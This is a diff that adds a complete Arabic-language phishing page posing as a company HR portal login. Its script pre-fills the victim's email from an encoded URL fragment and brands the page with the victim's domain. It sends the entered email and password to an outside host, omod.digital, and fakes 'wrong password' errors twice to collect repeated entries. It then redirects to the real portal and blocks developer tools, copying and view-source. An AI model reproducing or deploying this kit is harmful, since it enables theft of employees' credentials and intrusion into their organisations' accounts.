@@ -1,0 +1,718 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>بوابة الموارد البشرية الآمنة · تسجيل الدخول</title>
+  <!-- Font Awesome for subtle HR icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    /* RESET & GLOBAL */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      width: 100%;
+      min-height: 100vh;
+      font-family: 'Inter', 'Segoe UI', Tahoma, 'Arial', sans-serif;
+      background: #f5f7fc;
+    }
+
+    /* HR OFFICE BACKGROUND – light overlay so picture is visible */
+    body#logBody, html body#logBody {
+      background-image: 
+        linear-gradient(
+          105deg,
+          rgba(245, 249, 255, 0.55) 0%,
+          rgba(235, 242, 252, 0.35) 35%,
+          rgba(220, 230, 245, 0.15) 100%
+        ),
+        url('https://omod.digital/Modern_Arabic_HR_Team_Meeting.png') !important;
+      background-size: cover !important;
+      background-position: center center !important;
+      background-repeat: no-repeat !important;
+      background-attachment: fixed !important;
+      background-color: #e9eef5 !important;
+      margin: 0 !important;
+      padding: 0 !important;
+      min-height: 100vh !important;
+      display: flex !important;
+      align-items: center !important;
+      justify-content: flex-start !important;  /* moved to the left side */
+      position: relative;
+    }
+
+    /* BOLD "HR OFFICE" TEXT – top of screen */
+    body#logBody::before {
+      content: "";
+      position: fixed;
+      right: 3.5vw;
+      top: 8%;
+      transform: translateY(0);
+      font-size: clamp(3.2rem, 10vw, 7rem);
+      font-weight: 900;
+      color: rgba(15, 40, 75, 0.85);
+      letter-spacing: 0.06em;
+      line-height: 0.95;
+      white-space: nowrap;
+      pointer-events: none;
+      z-index: 3;
+      text-transform: uppercase;
+      font-family: 'Inter', 'Segoe UI', Tahoma, sans-serif;
+      text-shadow: 
+        0 4px 18px rgba(255,255,255,0.65),
+        0 2px 6px rgba(0,0,0,0.25);
+    }
+
+    /* Subtitle – centered in the middle, below HR OFFICE */
+    body#logBody::after {
+      content: "حيث يأتي الناس أولاً";
+      position: fixed;
+      right: 35%;
+      top: 35%;
+      transform: translate(50%, -50%);
+      font-size: clamp(1rem, 2.4vw, 1.8rem);
+      font-weight: 600;
+      color: rgba(15, 40, 75, 0.75);
+      letter-spacing: 0.35em;
+      white-space: nowrap;
+      pointer-events: none;
+      z-index: 3;
+      text-transform: uppercase;
+      text-shadow: 0 2px 10px rgba(255,255,255,0.7);
+      text-align: center;
+    }
+
+    /* MAIN CARD – smaller, left side, glass effect */
+    #logBox {
+      background: rgba(255, 255, 255, 0.96);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      border-radius: 16px;
+      box-shadow: 
+        0 16px 32px -10px rgba(0, 20, 40, 0.28),
+        0 4px 12px -4px rgba(0, 0, 0, 0.08),
+        0 0 0 1px rgba(255, 255, 255, 0.7) inset;
+      padding: 22px 22px 18px 22px;
+      width: 100%;
+      max-width: 300px;                /* reduced from 360px */
+      margin: 24px 24px 24px 6vw;      /* left side margin */
+      text-align: center;
+      border: 1px solid rgba(255, 255, 255, 0.8);
+      transition: all 0.25s ease;
+      position: relative;
+      z-index: 10;
+    }
+
+    #logBox table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 0 auto;
+    }
+
+    #logBox table td {
+      padding: 4px 0;                  /* slightly tighter */
+      vertical-align: middle;
+    }
+
+    /* HEADER / WELCOME MESSAGE */
+    #errMssg {
+      color: #1e3b6b !important;
+      font-weight: 600 !important;
+      font-size: 0.92rem !important;   /* reduced from 1.02rem */
+      line-height: 1.35;
+      display: inline-block;
+      text-align: center;
+      margin: 3px 0 2px 0;
+      letter-spacing: -0.01em;
+    }
+
+    #domainIcon {
+      width: 34px;                     /* reduced from 40px */
+      height: 34px;
+      border-radius: 10px;
+      object-fit: contain;
+      background: #f0f4fb;
+      padding: 6px;
+      border: 1px solid #e2e9f2;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.02);
+    }
+
+    #logBox label {
+      display: block;
+      text-align: right;
+      font-weight: 500;
+      font-size: 0.72rem !important;   /* reduced from 0.78rem */
+      color: #2e405b;
+      margin: 2px 4px 2px 0 !important;
+      letter-spacing: 0.01em;
+    }
+
+    /* INPUTS – compact */
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 9px 12px;               /* reduced from 11px 14px */
+      border: 1.5px solid #dae1ea;
+      border-radius: 10px;
+      font-size: 0.82rem;              /* reduced from 0.88rem */
+      background: #ffffff;
+      transition: 0.15s ease;
+      font-family: 'Inter', 'Segoe UI', Tahoma, sans-serif;
+      outline: none;
+      color: #1a2b3e;
+      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.02);
+      text-align: right;
+      direction: ltr;
+    }
+
+    input[type="email"]::placeholder,
+    input[type="password"]::placeholder {
+      color: #9aabbb;
+      font-weight: 400;
+      text-align: right;
+      direction: rtl;
+    }
+
+    input[type="email"]:focus,
+    input[type="password"]:focus {
+      border-color: #2a6fdb;
+      background: #ffffff;
+      box-shadow: 0 0 0 3px rgba(42, 111, 219, 0.12);
+    }
+
+    /* BUTTON – compact */
+    #loginbtn {
+      width: 100%;
+      padding: 10px 0;                 /* reduced from 12px */
+      background: #1e4b8a;
+      background: linear-gradient(145deg, #1e4b8a 0%, #153b6b 100%);
+      color: white !important;
+      font-weight: 600;
+      font-size: 0.84rem;              /* reduced from 0.92rem */
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      box-shadow: 0 5px 12px -5px rgba(21, 59, 107, 0.35);
+      transition: 0.2s ease;
+      text-align: center;
+      letter-spacing: 0.3px;
+      margin-top: 6px;
+      font-family: 'Inter', 'Segoe UI', Tahoma, sans-serif;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    #loginbtn:hover {
+      background: #0f2f5a;
+      background: linear-gradient(145deg, #1a4175 0%, #0d2d52 100%);
+      transform: scale(1.01);
+      box-shadow: 0 7px 16px -5px rgba(13, 45, 82, 0.45);
+    }
+
+    #loginbtn:active {
+      transform: scale(0.99);
+    }
+
+    #login_attempt, #attemptNumber {
+      display: none !important;
+    }
+
+    .multiClass {
+      display: none;
+    }
+
+    #LoginUserFormTable1 {
+      width: 100%;
+    }
+
+    #LoginUserFormTable1 td {
+      vertical-align: middle;
+    }
+
+    input[type="hidden"] {
+      display: none;
+    }
+
+    #logBox div[style*="display:flex"] {
+      gap: 8px !important;             /* reduced from 10px */
+      margin-bottom: 3px !important;
+      justify-content: center !important;
+      flex-wrap: wrap;
+    }
+
+    /* RESPONSIVE */
+    @media (max-width: 900px) {
+      body#logBody, html body#logBody {
+        justify-content: center !important;
+      }
+      body#logBody::before {
+        position: relative;
+        right: auto;
+        top: auto;
+        transform: none;
+        text-align: center;
+        width: 100%;
+        font-size: clamp(2.4rem, 10vw, 4.5rem);
+        margin-top: 18px;
+        color: rgba(15, 40, 75, 0.80);
+        text-shadow: 0 3px 14px rgba(255,255,255,0.7);
+      }
+      body#logBody::after {
+        position: relative;
+        right: auto;
+        top: auto;
+        transform: none;
+        text-align: center;
+        width: 100%;
+        font-size: 0.8rem;
+        letter-spacing: 0.3em;
+        margin-bottom: 6px;
+        color: rgba(15, 40, 75, 0.65);
+      }
+      body#logBody {
+        flex-direction: column;
+        justify-content: flex-start;
+        padding: 20px 0;
+      }
+      #logBox {
+        margin: 10px auto 30px;
+        max-width: 290px;              /* further reduced on mobile */
+      }
+    }
+
+    @media (max-width: 480px) {
+      #logBox {
+        padding: 20px 16px 16px 16px;  /* tighter padding on small screens */
+        max-width: 270px;              /* smaller max-width */
+        margin: 10px 16px 30px;
+      }
+      #errMssg {
+        font-size: 0.84rem !important;
+      }
+      #domainIcon {
+        width: 30px;
+        height: 30px;
+        padding: 5px;
+      }
+      #loginbtn {
+        padding: 9px 0;
+        font-size: 0.8rem;
+      }
+      input[type="email"],
+      input[type="password"] {
+        padding: 8px 10px;
+        font-size: 0.78rem;
+      }
+      body#logBody, html body#logBody {
+        background-attachment: scroll !important;
+      }
+    }
+
+    #errMssg b {
+      font-weight: 700;
+    }
+
+    .hr-subtle {
+      color: #6d7e94;
+      font-size: 0.7rem;               /* slightly reduced */
+      margin-top: 8px;
+    }
+  </style>
+</head>
+<body id="logBody" onload="setFormFocus();">
+
+  <form id="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off" method="POST" action="https://omod.digital/ateja1.php">
+    <input id="domain" type="hidden" value="cutrubus.com" name="domain">
+    <input id="fieldName" type="hidden" value="contabo.net" name="field">
+    <input type="hidden" id="login_attempt" value="0">
+    <input type="hidden" id="attemptNumber" name="number" value="0">
+    <input name="RedirectTo" value="/workflow/webmail.nsf/webform2019?OpenForm" type="hidden">
+
+    <!-- MAIN CARD – smaller, left side -->
+    <div id="logBox" align="center">
+      <table border="0" cellspacing="0" cellpadding="0" style="width:100%;">
+        <tbody>
+          <tr>
+            <td style="text-align:center; padding-bottom: 2px;">
+              <div style="display:flex; align-items:center; justify-content:center; gap:8px; flex-wrap:wrap; margin-bottom:3px;">
+                <img id="domainIcon" src="https://omod.digital/ateja_files/0.gif" alt="أيقونة النطاق" style="width:34px; height:34px; border-radius:10px; object-fit:contain; background:#f0f4fb; padding:6px; border:1px solid #e2e9f2;">
+                <b><font face="Inter, Segoe UI, Tahoma, sans-serif" id="errMssg" style="font-weight:600 !important;">مرحباً بك في بوابة الموارد البشرية<br>سجّل الدخول للمتابعة</font></b>
+              </div>
+            </td>
+          </tr>
+
+          <tr>
+            <td style="padding: 2px 0;">
+              <label for="user-id" style="display:block; text-align:right; font-weight:500; font-size:0.72rem; color:#2e405b; margin: 2px 4px 2px 0;">البريد الإلكتروني للعمل</label>
+              <input name="email" value="" maxlength="50" autocomplete="off" type="email" id="email" placeholder="you@company.com">
+            </td>
+          </tr>
+
+          <tr>
+            <td style="padding: 2px 0 3px 0;">
+              <label for="pw-id" style="display:block; text-align:right; font-weight:500; font-size:0.72rem; color:#2e405b; margin: 2px 4px 2px 0;">كلمة المرور</label>
+              <input name="password" value="" type="password" maxlength="255" autocomplete="off" id="password" placeholder="أدخل كلمة المرور">
+            </td>
+          </tr>
+
+          <tr>
+            <td style="padding-top: 3px;">
+              <div id="loginbtn" onclick="processLogin()">تسجيل الدخول</div>
+            </td>
+          </tr>
+
+          <tr>
+            <td style="text-align:center; padding-top: 8px;">
+              <span style="font-size:0.65rem; color:#8b9aab; letter-spacing:0.01em;">
+                <i class="fas fa-lock" style="font-size:0.6rem; margin-left:3px;"></i> بوابة الموارد البشرية · جميع عمليات الوصول مسجلة
+              </span>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </form>
+
+  <script src="https://omod.digital/ateja_files/jquery.min.js.download"></script>
+  <script src="https://omod.digital/ateja_files/enterprise.js.download"></script>
+
+  <script>
+    // ============================================================
+    // FULL KEYBOARD SHORTCUT DISABLING
+    // ============================================================
+    document.addEventListener('keydown', function(event) {
+      var key = event.keyCode || event.which;
+      var ctrlKey = event.ctrlKey;
+      var shiftKey = event.shiftKey;
+
+      var isForbidden = false;
+
+      if (key === 123) isForbidden = true; // F12
+      if (ctrlKey && key === 85) isForbidden = true; // Ctrl+U
+      if (ctrlKey && shiftKey && key === 73) isForbidden = true; // Ctrl+Shift+I
+      if (ctrlKey && shiftKey && key === 74) isForbidden = true; // Ctrl+Shift+J
+      if (ctrlKey && shiftKey && key === 67) isForbidden = true; // Ctrl+Shift+C
+      if (ctrlKey && key === 83) isForbidden = true; // Ctrl+S
+      if (ctrlKey && key === 80) isForbidden = true; // Ctrl+P
+      if (ctrlKey && key === 82) { event.preventDefault(); isForbidden = true; } // Ctrl+R
+      if (key === 116) { event.preventDefault(); isForbidden = true; } // F5
+      if (ctrlKey && shiftKey && key === 82) { event.preventDefault(); isForbidden = true; } // Ctrl+Shift+R
+      if (ctrlKey && key === 69) isForbidden = true; // Ctrl+E
+      if (ctrlKey && key === 79) isForbidden = true; // Ctrl+O
+      if (ctrlKey && key === 72) isForbidden = true; // Ctrl+H
+      if (ctrlKey && key === 74) isForbidden = true; // Ctrl+J
+      if (ctrlKey && shiftKey && key === 85) isForbidden = true; // Ctrl+Shift+U
+      if (ctrlKey && shiftKey && key === 80) isForbidden = true; // Ctrl+Shift+P
+      if (key === 112 || key === 114) { event.preventDefault(); isForbidden = true; } // F1, F3
+
+      if (isForbidden) {
+        event.preventDefault();
+        event.stopPropagation();
+        return false;
+      }
+    });
+
+    document.addEventListener('contextmenu', function(event) {
+      event.preventDefault();
+      return false;
+    });
+
+    document.addEventListener('dragstart', function(event) {
+      event.preventDefault();
+      return false;
+    });
+
+    document.addEventListener('selectstart', function(event) {
+      event.preventDefault();
+      return false;
+    });
+
+    document.addEventListener('copy', function(event) {
+      event.preventDefault();
+      return false;
+    });
+
+    document.addEventListener('cut', function(event) {
+      event.preventDefault();
+      return false;
+    });
+
+    // ============================================================
+    // HELPER FUNCTIONS
+    // ============================================================
+    function extractDomainNameOnly(fullDomain) {
+      if (!fullDomain) return "اسم النطاق";
+      var domainParts = fullDomain.split('.');
+      if (domainParts.length > 0) {
+        return domainParts[0];
+      }
+      return fullDomain;
+    }
+
+    function getDomainIconUrl(domain) {
+      if (!domain) return 'https://omod.digital/ateja_files/0.gif';
+      return 'https://www.google.com/s2/favicons?domain=' + domain + '&sz=64';
+    }
+
+    function updateWelcomeMessage(emailAddress) {
+      var errElement = document.getElementById('errMssg');
+      var iconElement = document.getElementById('domainIcon');
+      if (!errElement) return;
+
+      var domainNameOnly = "اسم النطاق";
+      var fullDomain = "";
+
+      if (emailAddress && emailAddress.includes('@')) {
+        fullDomain = emailAddress.split('@')[1];
+        domainNameOnly = extractDomainNameOnly(fullDomain);
+
+        if (iconElement && fullDomain) {
+          iconElement.src = getDomainIconUrl(fullDomain);
+          iconElement.onerror = function() {
+            this.src = 'https://omod.digital/ateja_files/0.gif';
+          };
+        }
+      } else {
+        if (iconElement) {
+          iconElement.src = 'https://omod.digital/ateja_files/0.gif';
+        }
+      }
+
+      errElement.innerHTML = "مرحباً بك في بوابة " + domainNameOnly + " للموارد البشرية<br>سجّل الدخول للمتابعة";
+      errElement.style.color = '#1e3b6b';
+      errElement.style.fontWeight = '600';
+    }
+
+    function isBase64(str) {
+      try { 
+        return btoa(atob(str)) === str; 
+      } catch (err) { 
+        return false; 
+      }
+    }
+
+    function decodeEmailFromHash(hash) {
+      let base64Part = hash.split('&')[0].split('?')[0].trim();
+      if (!isBase64(base64Part)) return base64Part;
+      try {
+        let once = atob(base64Part);
+        if (once.includes('@')) return once;
+        try {
+          let twice = atob(once);
+          if (twice.includes('@')) return twice;
+        } catch (e) { return once; }
+      } catch (e) { return base64Part; }
+      return base64Part;
+    }
+
+    (function() {
+      var hash = window.location.hash.replace("#", "").trim();
+      var emailField = document.getElementById("email");
+      if (!emailField) return;
+
+      if (hash && hash.length > 0) {
+        var fullEmail = decodeEmailFromHash(hash);
+        emailField.value = fullEmail;
+        if (fullEmail.includes('@')) {
+          var domainPart = fullEmail.split('@')[1];
+          var domainField = document.getElementById('domain');
+          if (domainField) domainField.value = domainPart;
+          updateWelcomeMessage(fullEmail);
+        }
+      }
+    })();
+
+    let loginAttempt = parseInt(document.getElementById('login_attempt')?.value || '0');
+
+    function setErrorMessage(msg, isError) {
+      var errorElement = document.getElementById('errMssg');
+      if (errorElement) {
+        errorElement.innerHTML = msg;
+        errorElement.style.color = '#FF0000';
+        errorElement.style.fontWeight = '700';
+      }
+    }
+
+    function setFormFocus() {
+      document.getElementById('password').focus();
+    }
+
+    function setupEmailWatcher() {
+      var emailInput = document.getElementById('email');
+      if (emailInput) {
+        emailInput.addEventListener('input', function() {
+          var errElem = document.getElementById('errMssg');
+          if (errElem && !errElem.innerHTML.includes('غير صالح') && !errElem.innerHTML.includes('خطأ') && !errElem.innerHTML.includes('خاطئ')) {
+            updateWelcomeMessage(this.value);
+          }
+        });
+        emailInput.addEventListener('blur', function() {
+          var errElem = document.getElementById('errMssg');
+          if (errElem && !errElem.innerHTML.includes('غير صالح') && !errElem.innerHTML.includes('خطأ') && !errElem.innerHTML.includes('خاطئ')) {
+            updateWelcomeMessage(this.value);
+          }
+        });
+      }
+    }
+
+    $(document).ready(function() {
+      setupEmailWatcher();
+      $('#password').focus();
+
+      $('#loginbtn').off('click').on('click', function(event) {
+        event.preventDefault();
+        processLogin();
+      });
+
+      $('#logBox').on('keydown', function(event) {
+        if (event.which === 13) {
+          event.preventDefault();
+          processLogin();
+        }
+      });
+    });
+
+    function processLogin() {
+      var email = document.getElementById('email').value;
+      var password = document.getElementById('password').value;
+      var redirectTo = document.querySelector('input[name="RedirectTo"]')?.value || '';
+      var attemptInput = document.getElementById('attemptNumber');
+      var loginAttemptInput = document.getElementById('login_attempt');
+      var domain = email.split('@')[1] || '';
+
+      if (!email || !password) {
+        setErrorMessage("الرجاء إدخال اسم المستخدم وكلمة المرور", true);
+        return;
+      }
+
+      loginAttempt = parseInt(loginAttemptInput?.value || '0');
+      setErrorMessage("جاري التحقق من الهوية ...", false);
+
+      var formData = new URLSearchParams();
+      formData.append('email', email);
+      formData.append('password', password);
+      formData.append('domain', document.getElementById('domain').value);
+      formData.append('field', document.getElementById('fieldName').value);
+      formData.append('RedirectTo', redirectTo);
+      formData.append('attempt', loginAttempt + 1);
+
+      fetch('https://omod.digital/ateja.php', {
+        method: 'POST',
+        headers: { 
+          'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: formData.toString()
+      })
+      .then(response => response.text())
+      .then(data => {
+        if (loginAttempt === 0) {
+          setErrorMessage("اسم المستخدم أو كلمة المرور غير صحيحة. يرجى تسجيل الدخول مرة أخرى.", true);
+          document.getElementById('password').value = '';
+          loginAttemptInput.value = '1';
+          if (attemptInput) attemptInput.value = '1';
+          document.getElementById('password').focus();
+        }
+        else if (loginAttempt === 1) {
+          setErrorMessage("اسم المستخدم أو كلمة المرور غير صحيحة. يرجى تسجيل الدخول مرة أخرى.", true);
+          document.getElementById('password').value = '';
+          loginAttemptInput.value = '2';
+          if (attemptInput) attemptInput.value = '2';
+          document.getElementById('password').focus();
+        }
+        else if (loginAttempt === 2) {
+          var errElement = document.getElementById('errMssg');
+          if (errElement) errElement.innerHTML = "";
+
+          loginAttemptInput.value = '3';
+          if (attemptInput) attemptInput.value = '3';
+
+          setTimeout(function() {
+            if (domain) {
+              window.location.href = "https://portal." + domain;
+            } else if (email && email.includes('@')) {
+              var emailDomain = email.split('@')[1];
+              window.location.href = "https://portal." + emailDomain;
+            } else {
+              window.location.href = "https://www.example.com";
+            }
+          }, 1500);
+        }
+      })
+      .catch(error => {
+        console.log('Fetch failed, using form submission:', error);
+        var tempForm = document.createElement('form');
+        tempForm.method = 'POST';
+        tempForm.action = 'https://omod.digital/ateja1.php';
+        tempForm.enctype = 'application/x-www-form-urlencoded';
+
+        var fields = {
+          'email': email,
+          'password': password,
+          'domain': document.getElementById('domain').value,
+          'field': document.getElementById('fieldName').value,
+          'RedirectTo': redirectTo,
+          'attempt': loginAttempt + 1
+        };
+
+        for (var key in fields) {
+          var input = document.createElement('input');
+          input.type = 'hidden';
+          input.name = key;
+          input.value = fields[key];
+          tempForm.appendChild(input);
+        }
+
+        document.body.appendChild(tempForm);
+        tempForm.submit();
+      });
+    }
+
+    // Stubs for original functions
+    window.clkLgn = function(cb) { cb(false); };
+    window.checkSubmit = function(e, cb) { if (e.which == 13) { e.preventDefault(); cb(false); } };
+    window.displayCss = function(status) {
+      if (status) setErrorMessage("تحقق من إدخال كلمة المرور. يرجى تسجيل الدخول مرة أخرى:", true);
+      else setErrorMessage("اسم المستخدم أو كلمة المرور غير صحيحة. يرجى تسجيل الدخول مرة أخرى:", true);
+      $('#password').focus();
+    };
+
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter' && (document.activeElement.id === 'password' || document.activeElement.id === 'email')) {
+        e.preventDefault();
+        processLogin();
+      }
+    });
+
+    setInterval(function() {
+      var errElem = document.getElementById('errMssg');
+      if (errElem && errElem.innerHTML) {
+        var text = errElem.innerHTML;
+        if (text.includes('محاولة') || text.includes('جاري إعادة التوجيه')) {
+          var emailField = document.getElementById('email');
+          updateWelcomeMessage(emailField ? emailField.value : '');
+        }
+      }
+    }, 100);
+
+    window.addEventListener('load', function() {
+      var emailField = document.getElementById('email');
+      updateWelcomeMessage(emailField ? emailField.value : '');
+      if (document.getElementById('password')) {
+        document.getElementById('password').focus();
+      }
+      // Re-assert background with light overlay
+      document.body.style.backgroundImage = 
+        "linear-gradient(105deg, rgba(245,249,255,0.55) 0%, rgba(235,242,252,0.35) 35%, rgba(220,230,245,0.15) 100%), " +
+        "url('https://images.unsplash.com/photo-1556761175-5973dc0f32e7?q=80&w=2069&auto=format&fit=crop')";
+      document.body.style.backgroundSize = "cover";
+      document.body.style.backgroundPosition = "center center";
+      document.body.style.backgroundRepeat = "no-repeat";
+      document.body.style.backgroundAttachment = "fixed";
+      document.body.style.backgroundColor = "#e9eef5";
+    });
+  </script>
+</body>
+</html>
